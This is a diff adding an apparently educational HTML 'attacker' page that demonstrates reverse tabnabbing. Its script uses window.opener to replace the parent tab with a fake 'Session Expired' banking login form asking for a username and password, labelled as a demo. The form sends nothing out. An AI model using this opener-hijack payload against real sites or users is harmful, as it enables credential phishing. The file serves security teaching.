@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attacker — Tabnab</title>
+<style>
+body {
+    margin: 0; font-family: -apple-system, sans-serif;
+    background: #1a1a2e; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; text-align: center; padding: 20px;
+}
+.box { max-width: 400px; }
+h1 { color: #ff3366; }
+</style>
+</head>
+<body>
+<div class="box">
+    <h1>⚠ Tab Hijacked</h1>
+    <p>This page used <code>window.opener.location</code> to replace your original tab with a phishing login.</p>
+    <p style="margin-top:20px;font-size:0.9rem;opacity:0.8">In this demo, the parent tab shows a simulated phishing redirect message.</p>
+</div>
+<script>
+if (window.opener && !window.opener.closed) {
+    try {
+        window.opener.document.body.innerHTML =
+            '<div style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f5f5f5;min-height:100vh">' +
+            '<h2 style="color:#c62828">Session Expired</h2>' +
+            '<p>Please log in again to continue banking.</p>' +
+            '<form style="max-width:300px;margin:20px auto">' +
+            '<input style="width:100%;padding:10px;margin:8px 0" placeholder="Username">' +
+            '<input type="password" style="width:100%;padding:10px;margin:8px 0" placeholder="Password">' +
+            '<button style="width:100%;padding:12px;background:#1565c0;color:#fff;border:none">Login</button>' +
+            '</form><p style="color:#999;font-size:0.8rem">[ DEMO ] Original tab replaced via reverse tabnabbing</p></div>';
+    } catch (e) {
+        document.body.innerHTML += '<p style="color:#ffaa00">Cross-origin blocked opener access (good security). Demo simulated.</p>';
+    }
+}
+</script>
+</body>
+</html>
